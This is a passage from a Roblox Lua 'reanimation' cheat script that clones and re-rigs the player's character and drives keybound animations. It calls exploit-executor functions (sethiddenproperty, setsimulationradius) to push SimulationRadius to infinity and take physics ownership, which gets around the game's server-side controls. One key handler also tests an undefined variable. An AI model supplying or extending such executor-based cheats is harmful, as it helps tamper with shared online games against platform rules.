local renderstepped = rs.RenderStepped
local sg = game:GetService("StarterGui")
local ws = game:GetService("Workspace")
local cf = CFrame.new
local v3 = Vector3.new
local v3_0 = v3(0, 0, 0)
local inf = math.huge
 
local c = lp.Character
 
if not (c and c.Parent) then
    return
end
 
for i, v in pairs(c:GetDescendants()) do
    if v:IsA("CharacterMesh") or v:IsA("SpecialMesh") then
        v:Destroy()
    end
end
 
c:GetPropertyChangedSignal("Parent"):Connect(function()
    if not (c and c.Parent) then
        c = nil
    end
end)
 
local function gp(parent, name, className)
    local ret = nil
    pcall(function()
        for i, v in pairs(parent:GetChildren()) do
            if (v.Name == name) and v:IsA(className) then
                ret = v
                break
            end
        end
    end)
    return ret
end
 
local function align(Part0, Part1)
    Part0.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)
 
    local att0 = Instance.new("Attachment", Part0)
    att0.Orientation = v3_0
    att0.Position = v3_0
    att0.Name = "att0_" .. Part0.Name
    local att1 = Instance.new("Attachment", Part1)
    att1.Orientation = v3_0
    att1.Position = v3_0
    att1.Name = "att1_" .. Part1.Name
 
    if (alignmode == 1) or (alignmode == 2) then
        local ape = Instance.new("AlignPosition", att0)
        ape.ApplyAtCenterOfMass = false
        ape.MaxForce = inf
        ape.MaxVelocity = inf
        ape.ReactionForceEnabled = false
        ape.Responsiveness = 200
        ape.Attachment1 = att1
        ape.Attachment0 = att0
        ape.Name = "AlignPositionRtrue"
        ape.RigidityEnabled = true
    end
 
    if (alignmode == 2) or (alignmode == 3) then
        local apd = Instance.new("AlignPosition", att0)
        apd.ApplyAtCenterOfMass = false
        apd.MaxForce = inf
        apd.MaxVelocity = inf
        apd.ReactionForceEnabled = false
        apd.Responsiveness = 200
        apd.Attachment1 = att1
        apd.Attachment0 = att0
        apd.Name = "AlignPositionRfalse"
        apd.RigidityEnabled = false
    end
 
    local ao = Instance.new("AlignOrientation", att0)
    ao.MaxAngularVelocity = inf
    ao.MaxTorque = inf
    ao.PrimaryAxisOnly = false
    ao.ReactionTorqueEnabled = false
    ao.Responsiveness = 200
    ao.Attachment1 = att1
    ao.Attachment0 = att0
    ao.RigidityEnabled = false
 
    if netboost then
        Part0:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (Part0 and Part0.Parent) then
                Part0 = nil
            end
        end)
        spawn(function()
            if typeof(netboost) == "Vector3" then
                local vel = v3_0
                local rotvel = v3_0
                while Part0 do
                    Part0.Velocity = vel
                    Part0.RotVelocity = rotvel
                    heartbeat:Wait()
                    if Part0 then
                        vel = Part0.Velocity
                        Part0.Velocity = netboost
                        Part0.RotVelocity = v3_0
                        stepped:Wait()
                    end
                end
            elseif typeof(netboost) == "number" then
                local vel = v3_0
                local rotvel = v3_0
                while Part0 do
                    Part0.Velocity = vel
                    Part0.RotVelocity = rotvel
                    heartbeat:Wait()
                    if Part0 then
                        local newvel = vel
                        local mag = newvel.Magnitude
                        if mag < idleMag then
                            newvel = v3(0, netboost, 0)
                        else
                            local multiplier = netboost / mag
                            newvel *= v3(multiplier,  multiplier, multiplier)
                        end
                        vel = Part0.Velocity
                        rotvel = Part0.RotVelocity
                        Part0.Velocity = newvel
                        Part0.RotVelocity = v3_0
                        stepped:Wait()
                    end
                end
            end
        end)
    end
end
 
local function respawnrequest()
    local c = lp.Character
    local ccfr = ws.CurrentCamera.CFrame
    local fc = Instance.new("Model")
    local nh = Instance.new("Humanoid", fc)
    lp.Character = fc
    nh.Health = 0
    lp.Character = c
    fc:Destroy()
    local con = nil
    local function confunc()
        con:Disconnect()
        ws.CurrentCamera.CFrame = ccfr
    end
    con = renderstepped:Connect(confunc)
end
 
local destroyhum = (method == 4) or (method == 5)
local breakjoints = (method == 0) or (method == 4)
local antirespawn = (method == 0) or (method == 2) or (method == 3)
 
addtools = addtools and gp(lp, "Backpack", "Backpack")
 
if simradius == "shp" then
    local shp = sethiddenproperty or set_hidden_property or set_hidden_prop or sethiddenprop
    if shp then
        spawn(function()
            while c and heartbeat:Wait() do
                shp(lp, "SimulationRadius", inf)
            end
        end)
    end
elseif simradius == "ssr" then
    local ssr = setsimulationradius or set_simulation_radius or set_sim_radius or setsimradius or set_simulation_rad or setsimulationrad
    if ssr then
        spawn(function()
            while c and heartbeat:Wait() do
                ssr(inf)
            end
        end)
    end
end
 
antiragdoll = antiragdoll and function(v)
    if v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
        v.Parent = nil
    end
end
 
if antiragdoll then
    for i, v in pairs(c:GetDescendants()) do
        antiragdoll(v)
    end
    c.DescendantAdded:Connect(antiragdoll)
end
 
if antirespawn then
    respawnrequest()
end
 
if method == 0 then
    wait(loadtime)
    if not c then
        return
    end
end
 
if discharscripts then
    for i, v in pairs(c:GetChildren()) do
        if v:IsA("LocalScript") then
            v.Disabled = true
        end
    end
elseif newanimate then
    local animate = gp(c, "Animate", "LocalScript")
    if animate and (not animate.Disabled) then
        animate.Disabled = true
    else
        newanimate = false
    end
end
 
local hum = c:FindFirstChildOfClass("Humanoid")
if hum then
    for i, v in pairs(hum:GetPlayingAnimationTracks()) do
        v:Stop()
    end
end
 
if addtools then
    for i, v in pairs(addtools:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = c
        end
    end
end
 
pcall(function()
    settings().Physics.AllowSleep = false
    settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
end)
 
local OLDscripts = {}
 
for i, v in pairs(c:GetDescendants()) do
    if v.ClassName == "Script" then
        table.insert(OLDscripts, v)
    end
end
 
local scriptNames = {}
 
for i, v in pairs(c:GetDescendants()) do
    if v:IsA("BasePart") then
        local newName = tostring(i)
        local exists = true
        while exists do
            exists = false
            for i, v in pairs(OLDscripts) do
                if v.Name == newName then
                    exists = true
                end
            end
            if exists then
                newName = newName .. "_"    
            end
        end
        table.insert(scriptNames, newName)
        Instance.new("Script", v).Name = newName
    end
end
 
c.Archivable = true
local cl = c:Clone()
for i, v in pairs(cl:GetDescendants()) do
    pcall(function()
        v.Transparency = 1
        v.Anchored = false
    end)
end
 
local model = Instance.new("Model", c)
model.Name = model.ClassName
 
model:GetPropertyChangedSignal("Parent"):Connect(function()
    if not (model and model.Parent) then
        model = nil
    end
end)
 
for i, v in pairs(c:GetChildren()) do
    if v ~= model then
        if destroyhum and v:IsA("Humanoid") then
            v:Destroy()
        else
            if addtools and v:IsA("Tool") then
                for i1, v1 in pairs(v:GetDescendants()) do
                    if v1 and v1.Parent and v1:IsA("BasePart") then
                        local bv = Instance.new("BodyVelocity", v1)
                        bv.Velocity = v3_0
                        bv.MaxForce = v3(1000, 1000, 1000)
                        bv.P = 1250
                        bv.Name = "bv_" .. v.Name
                    end
                end
            end
            v.Parent = model
        end
    end
end
local head = gp(model, "Head", "BasePart")
local torso = gp(model, "Torso", "BasePart") or gp(model, "UpperTorso", "BasePart")
if breakjoints then
    model:BreakJoints()
else
    if head and torso then
        for i, v in pairs(model:GetDescendants()) do
            if v:IsA("Weld") or v:IsA("Snap") or v:IsA("Glue") or v:IsA("Motor") or v:IsA("Motor6D") then
                local save = false
                if (v.Part0 == torso) and (v.Part1 == head) then
                    save = true
                end
                if (v.Part0 == head) and (v.Part1 == torso) then
                    save = true
                end
                if save then
                    if hedafterneck then
                        hedafterneck = v
                    end
                else
                    v:Destroy()
                end
            end
        end
    end
    if method == 3 then
        spawn(function()
            wait(loadtime)
            if model then
                model:BreakJoints()
            end
        end)
    end
end
 
cl.Parent = c
for i, v in pairs(cl:GetChildren()) do
    v.Parent = c
end
cl:Destroy()
 
local modelDes = {}
for i, v in pairs(model:GetDescendants()) do
    if v:IsA("BasePart") then
        i = tostring(i)
        local con = nil
        con = v:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (v and v.Parent) then
                con:Disconnect()
                modelDes[i] = nil
            end
        end)
        modelDes[i] = v
    end
end
local modelcolcon = nil
local function modelcolf()
    if model then
        for i, v in pairs(modelDes) do
            v.CanCollide = false
        end
    else
        modelcolcon:Disconnect()
    end
end
modelcolcon = stepped:Connect(modelcolf)
modelcolf()
 
for i, scr in pairs(model:GetDescendants()) do
    if (scr.ClassName == "Script") and table.find(scriptNames, scr.Name) then
        local Part0 = scr.Parent
        if Part0:IsA("BasePart") then
            for i1, scr1 in pairs(c:GetDescendants()) do
                if (scr1.ClassName == "Script") and (scr1.Name == scr.Name) and (not scr1:IsDescendantOf(model)) then
                    local Part1 = scr1.Parent
                    if (Part1.ClassName == Part0.ClassName) and (Part1.Name == Part0.Name) then
                        align(Part0, Part1)
                        break
                    end
                end
            end
        end
    end
end
 
if (typeof(hedafterneck) == "Instance") and head and head.Parent then
    local aligns = {}
    for i, v in pairs(head:GetDescendants()) do
        if v:IsA("AlignPosition") or v:IsA("AlignOrientation") then
            table.insert(aligns, v)
            v.Enabled = false
        end
    end
    spawn(function()
        while c and hedafterneck and hedafterneck.Parent do
            stepped:Wait()
        end
        if not (c and head and head.Parent) then
            return
        end
        for i, v in pairs(aligns) do
            pcall(function()
                v.Enabled = true
            end)
        end
    end)
end
 
for i, v in pairs(c:GetDescendants()) do
    if v and v.Parent then
        if v.ClassName == "Script" then
            if table.find(scriptNames, v.Name) then
                v:Destroy()
            end
        elseif not v:IsDescendantOf(model) then
            if v:IsA("Decal") then
                v.Transparency = 1
            elseif v:IsA("ForceField") then
                v.Visible = false
            elseif v:IsA("Sound") then
                v.Playing = false
            elseif v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
                v.Enabled = false
            end
        end
    end
end
 
if newanimate then
    local animate = gp(c, "Animate", "LocalScript")
    if animate then
        animate.Disabled = false
    end
end
 
if addtools then
    for i, v in pairs(c:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = addtools
        end
    end
end
 
local hum0 = model:FindFirstChildOfClass("Humanoid")
local hum1 = c:FindFirstChildOfClass("Humanoid")
if hum1 then
    ws.CurrentCamera.CameraSubject = hum1
    local camSubCon = nil
    local function camSubFunc()
        camSubCon:Disconnect()
        if c and hum1 and (hum1.Parent == c) then
            ws.CurrentCamera.CameraSubject = hum1
        end
    end
    camSubCon = renderstepped:Connect(camSubFunc)
    if hum0 then
        hum0.Changed:Connect(function(prop)
            if (prop == "Jump") and hum1 and hum1.Parent then
                hum1.Jump = hum0.Jump
            end
        end)
    else
        lp.Character = nil
        lp.Character = c
    end
end
 
local rb = Instance.new("BindableEvent", c)
rb.Event:Connect(function()
    rb:Destroy()
    sg:SetCore("ResetButtonCallback", true)
    if destroyhum then
        c:BreakJoints()
        return
    end
    if antirespawn then
        if hum0 and hum0.Parent and (hum0.Health > 0) then
            model:BreakJoints()
            hum0.Health = 0
        end
        respawnrequest()
    else
        if hum0 and hum0.Parent and (hum0.Health > 0) then
            model:BreakJoints()
            hum0.Health = 0
        end
    end
end)
sg:SetCore("ResetButtonCallback", rb)
 
spawn(function()
    while c do
        if hum0 and hum0.Parent and hum1 and hum1.Parent then
            hum1.Jump = hum0.Jump
        end
        wait()
    end
    sg:SetCore("ResetButtonCallback", true)
end)
 
R15toR6 = R15toR6 and hum1 and (hum1.RigType == Enum.HumanoidRigType.R15)
if R15toR6 then
    local cfr = nil
    pcall(function()
        cfr = gp(c, "HumanoidRootPart", "BasePart").CFrame
    end)
    if cfr then
        local R6parts = { 
            head = {
                Name = "Head",
                Size = v3(2, 1, 1),
                R15 = {
                    Head = 0
                }
            },
            torso = {
                Name = "Torso",
                Size = v3(2, 2, 1),
                R15 = {
                    UpperTorso = 0.2,
                    LowerTorso = -0.8
                }
            },
            root = {
                Name = "HumanoidRootPart",
                Size = v3(2, 2, 1),
                R15 = {
                    HumanoidRootPart = 0
                }
            },
            leftArm = {
                Name = "Left Arm",
                Size = v3(1, 2, 1),
                R15 = {
                    LeftHand = -0.85,
                    LeftLowerArm = -0.2,
                    LeftUpperArm = 0.4
                }
            },
            rightArm = {
                Name = "Right Arm",
                Size = v3(1, 2, 1),
                R15 = {
                    RightHand = -0.85,
                    RightLowerArm = -0.2,
                    RightUpperArm = 0.4
                }
            },
            leftLeg = {
                Name = "Left Leg",
                Size = v3(1, 2, 1),
                R15 = {
                    LeftFoot = -0.85,
                    LeftLowerLeg = -0.15,
                    LeftUpperLeg = 0.6
                }
            },
            rightLeg = {
                Name = "Right Leg",
                Size = v3(1, 2, 1),
                R15 = {
                    RightFoot = -0.85,
                    RightLowerLeg = -0.15,
                    RightUpperLeg = 0.6
                }
            }
        }
        for i, v in pairs(c:GetChildren()) do
            if v:IsA("BasePart") then
                for i1, v1 in pairs(v:GetChildren()) do
                    if v1:IsA("Motor6D") then
                        v1.Part0 = nil
                    end
                end
            end
        end
        for i, v in pairs(R6parts) do
            local part = Instance.new("Part")
            part.Name = v.Name
            part.Size = v.Size
            part.CFrame = cfr
            part.Anchored = false
            part.Transparency = 1
            part.CanCollide = false
            for i1, v1 in pairs(v.R15) do
                local R15part = gp(c, i1, "BasePart")
                local att = gp(R15part, "att1_" .. i1, "Attachment")
                if R15part then
                    local weld = Instance.new("Weld", R15part)
                    weld.Name = "Weld_" .. i1
                    weld.Part0 = part
                    weld.Part1 = R15part
                    weld.C0 = cf(0, v1, 0)
                    weld.C1 = cf(0, 0, 0)
                    R15part.Massless = true
                    R15part.Name = "R15_" .. i1
                    R15part.Parent = part
                    if att then
                        att.Parent = part
                        att.Position = v3(0, v1, 0)
                    end
                end
            end
            part.Parent = c
            R6parts[i] = part
        end
        local R6joints = {
            neck = {
                Parent = R6parts.torso,
                Name = "Neck",
                Part0 = R6parts.torso,
                Part1 = R6parts.head,
                C0 = cf(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
                C1 = cf(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
            },
            rootJoint = {
                Parent = R6parts.root,
                Name = "RootJoint" ,
                Part0 = R6parts.root,
                Part1 = R6parts.torso,
                C0 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
                C1 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
            },
            rightShoulder = {
                Parent = R6parts.torso,
                Name = "Right Shoulder",
                Part0 = R6parts.torso,
                Part1 = R6parts.rightArm,
                C0 = cf(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
                C1 = cf(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
            },
            leftShoulder = {
                Parent = R6parts.torso,
                Name = "Left Shoulder",
                Part0 = R6parts.torso,
                Part1 = R6parts.leftArm,
                C0 = cf(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
                C1 = cf(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
            },
            rightHip = {
                Parent = R6parts.torso,
                Name = "Right Hip",
                Part0 = R6parts.torso,
                Part1 = R6parts.rightLeg,
                C0 = cf(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
                C1 = cf(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
            },
            leftHip = {
                Parent = R6parts.torso,
                Name = "Left Hip" ,
                Part0 = R6parts.torso,
                Part1 = R6parts.leftLeg,
                C0 = cf(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
                C1 = cf(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
            }
        }
        for i, v in pairs(R6joints) do
            local joint = Instance.new("Motor6D")
            for prop, val in pairs(v) do
                joint[prop] = val
            end
            R6joints[i] = joint
        end
        hum1.RigType = Enum.HumanoidRigType.R6
        hum1.HipHeight = 0
    end
end
 
wait()
if not c then
    return
end
 
local venttoggle = false
local vented = false
local mode2 = false
local attack = false
local modetoggle = false
local dead = false
local dtoggle = false
local sittoggle = false
local sit = false
local sine = 0
local mouse = lp:GetMouse()
 
local joints = {
    ["RootJoint"] = "",
    ["Neck"] = "",
    ["Right Hip"] = "",
    ["Left Hip"] = "",
    ["Left Shoulder"] = "",
    ["Right Shoulder"] = ""
}
 
for i, v in pairs(c:GetDescendants()) do
    if v:IsA("Motor6D") and (joints[v.Name] == "") and (not v:IsDescendantOf(model)) then
        joints[v.Name] = v
    end
end
 
for i, v in pairs(joints) do
    if v and (v ~= "") then
        v.C0 = cf(0, 0, 0)
        v.C1 = cf(0, 0, 0)
    else
        return
    end
end
 
local Root = gp(c, "HumanoidRootPart", "BasePart")
if not Root then
    return
end
 
local function replace(a)
    local b, c = a.Part0, a.Part1
    a.Part1, a.Part0 = b, c
end
 
replace(joints["Left Shoulder"])
replace(joints["Right Shoulder"])
replace(joints["Left Hip"])
replace(joints["Right Hip"])
 
for i, v in pairs(c:GetChildren()) do
    if v:IsA("Accessory") then
        v:Destroy()
    end
end
 
joints.Neck.C0 = cf(0, 0.3, -0.5)
 
mouse.Button1Down:Connect(function()
    if not (kill or mode2 or dead) then
        attack = true
        vented = false
        hum1.WalkSpeed = 0
        wait(0.5)
        hum1.WalkSpeed = 16
        attack = false
    end
end)
 
mouse.KeyDown:Connect(function(key)
    if not c then 
        return 
    end
    key = key:lower()
    if k == "e" then
        if not venttoggle then
            modetoggle = false
            mode2 = false
            venttoggle = true
            vented = true
            hum1.WalkSpeed = 100
            position = "ventidle"
        elseif venttoggle then
            venttoggle = false
            vented = false
            hum1.WalkSpeed = 16
        end
    elseif key == "f" then
        if not modetoggle then
            venttoggle = false
            vented = false
            modetoggle = true
            mode2 = true
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 60
        elseif modetoggle then
            modetoggle = false
            mode2 = false
            hum1.WalkSpeed = 16
        end
    elseif key == "q" then
        if dtoggle == false then
            venttoggle = false
            vented = false
            modetoggle = false
            mode2 = false
            dtoggle = true
            dead = true
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 0
        elseif dtoggle == true then
            dtoggle = false
            dead = false
            hum1.WalkSpeed = 16
        end
    elseif key == "c" then
        if sittoggle == false then
            venttoggle = false
            vented = false
            modetoggle = false
            mode2 = false
            dtoggle = false
            dead = false
            sittoggle = true
            sit = true
            hum1.WalkSpeed = 0
        elseif sittoggle == true then
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 16
        end
    end
end)
 
local pose = "idle"
while stepped:Wait() and c do
    if attack then
        pose = "attack"
    elseif dead then
        pose = "dead"
    elseif sit then
        pose = "sit"
    elseif mode2 then
        if Root.Velocity.Magnitude < 2 then
            pose = "idle2"
        elseif Root.Velocity.Magnitude > 20 then
            pose = "walk2"
        end
    else
        if Root.Velocity.y > 1 then
            pose = "jump"
        elseif Root.Velocity.y < -1 then
            pose = "fall"
        elseif Root.Velocity.Magnitude < 2 then
            pose = "idle"
        elseif Root.Velocity.Magnitude < 20 then
            pose = "walk"
        elseif Root.Velocity.Magnitude > 20 then
            pose = "run"
        end 
    end
    sine += 1
    if pose == "idle" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0.3 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(20 + 0 * math.sin(sine/12)), math.rad(-3 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(-20 + 0 * math.sin(sine/12)), math.rad(3 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "walk" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0.3 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0.3 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 30 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + -0.3 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + -30 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "jump" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(15 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "fall" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(15 + 10 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-10 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(10 + 5 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(10 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "vent" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + -8 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 1.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "ventidle" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), -20 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 1.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "idle2" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/20), 3 + 0.3 * math.sin(sine/20), 0 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + 20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(20 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/20), 2 + 0 * math.sin(sine/20), 0.5 + -0.5 * math.sin(sine/20)) * CFrame.Angles(math.rad(10 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
    elseif pose == "walk2" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/20), 3 + 0.3 * math.sin(sine/20), 0 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(-60 + 10 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/20), 2 + 0 * math.sin(sine/20), 0.3 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + -10 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(-5 + 0 * math.sin(sine/20))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20), 0.5 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(5 + 0 * math.sin(sine/20))),0.1)
    elseif pose == "attack" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(4 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "sit" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), -1.8 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(10 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), -1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/12)), math.rad(10 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
